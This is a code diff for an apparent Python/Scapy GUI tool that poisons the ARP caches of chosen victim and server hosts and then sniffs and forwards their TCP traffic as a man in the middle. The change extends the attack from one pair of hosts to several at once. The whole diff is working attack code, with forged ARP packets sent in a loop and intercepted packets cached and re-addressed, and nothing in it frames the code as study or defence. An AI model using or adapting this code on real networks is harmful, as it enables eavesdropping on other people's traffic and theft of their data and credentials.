@@ -6,8 +6,11 @@ import time
 
 def GetMacFromIp(targetip):
     arppacket= Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 1, pdst = targetip)
-    targetmac= srp(arppacket, timeout=2 , verbose= False, iface = "enp0s3")[0][0][1].hwsrc
-    return targetmac
+    try:
+        targetmac= srp(arppacket, timeout=2 , verbose= False, iface = "enp0s3")[0][0][1].hwsrc
+        return targetmac
+    except:
+            print("WARNING: Host " + str(targetip) + " unreachable.");
 
 def GeneratePacket(selfMac, serverIp, victimMac, victimIp):
     r = Ether()/ARP()
@@ -76,11 +79,18 @@ class Application(Frame):
         self.stoparp['state'] = 'normal'
         
         self.victimIp  = self.uArpEntryIpVictim.get()
-        self.victimMac = GetMacFromIp(self.victimIp)
+        self.victimIp  = self.victimIp.split(',')
+
+        self.victimMac, self.serverMac = [], []
+
+        for index in range(0, len(self.victimIp)):
+            self.victimMac.append(GetMacFromIp(self.victimIp[index]))
 
         self.serverIp = self.uArpEntryIpServer.get()
-        self.serverMac = GetMacFromIp(self.serverIp)
-
+        self.serverIp = self.serverIp.split(',')
+        for index in range(0, len(self.serverIp)):
+            self.serverMac.append(GetMacFromIp(self.serverIp[index]))
+        
         # start a sepparate thread for continously poisoning the targets
         self.poison_t.start()
 
@@ -96,22 +106,25 @@ class Application(Frame):
      
     def arp_poison(self):
         while True:
-            if self.poison_t.killed == True:
-                self.poison_t.killed = False
-                print "[ARP] Stopping poisoning thread... [1/2]"
-                raise SystemExit()
-            if self.victimIp == self.serverIp:
-                print "Error in Scapper/poison_t: Match between server and victim IP."
-                return
-            else:
-                packet = GeneratePacket(self.selfMac, self.serverIp, self.victimMac, self.victimIp)
-                sendp(packet, verbose = False, iface = self.networkInterface)
+            for i in range(0, len(self.victimIp)):
+                for j in range(0, len(self.serverIp)):
+                    if self.poison_t.killed == True:
+                        self.poison_t.killed = False
+                        print "[ARP] Stopping poisoning thread... [1/2]"
+                        raise SystemExit()
+                    if self.victimIp[i] == self.serverIp[j]:
+                        print "Error in Scapper/poison_t: Match between server and victim IP."
+                        self.stopArp()
+                        return
+                    else:
+                        packet = GeneratePacket(self.selfMac, self.serverIp[j], self.victimMac[i], self.victimIp[i])
+                        sendp(packet, verbose = False, iface = self.networkInterface)
 
-                packet = GeneratePacket(self.selfMac, self.victimIp, self.serverMac, self.serverIp)
-                sendp(packet, verbose = False, iface = self.networkInterface)
+                        packet = GeneratePacket(self.selfMac, self.victimIp[i], self.serverMac[j], self.serverIp[j])
+                        sendp(packet, verbose = False, iface = self.networkInterface)
 
-                print "[ARP] Poisoning ARP cache of: " + str([self.victimIp, self.serverIp])
-            time.sleep(10)
+                        print "[ARP] Poisoning ARP cache of: " + str([self.victimIp[i], self.serverIp[j]])
+                    time.sleep(10)
 
     def interceptAndForward(self, packet):
         # define custom action for sniff
@@ -121,15 +134,15 @@ class Application(Frame):
             raise SystemExit()
         self.interceptedPackets.append(packet);
         print "[ARP] Cached 1 packet..."
-        if packet[IP].dst == self.serverIp:
-            packet[Ether].dst = self.serverMac
+        if packet[IP].dst in self.serverIp:
+            packet[Ether].dst = self.serverMac[self.serverIp.index(packet[IP].dst)]
         else:
-            packet[Ether].dst = self.victimMac
+            packet[Ether].dst = self.victimMac[self.victimIp.index(packet[IP].dst)]
         packet[Ether].src = self.selfMac
         sendp(packet, verbose = False, iface = self.networkInterface)
 
     def TCPFilter(self, packet):
-        if packet.haslayer(TCP) and packet[Ether].dst == self.selfMac and (packet[IP].dst == self.serverIp or packet[IP].dst == self.victimIp):
+        if packet.haslayer(TCP) and packet[Ether].dst == self.selfMac and (packet[IP].dst in self.serverIp or packet[IP].dst in self.victimIp):
             return True
         return False
 
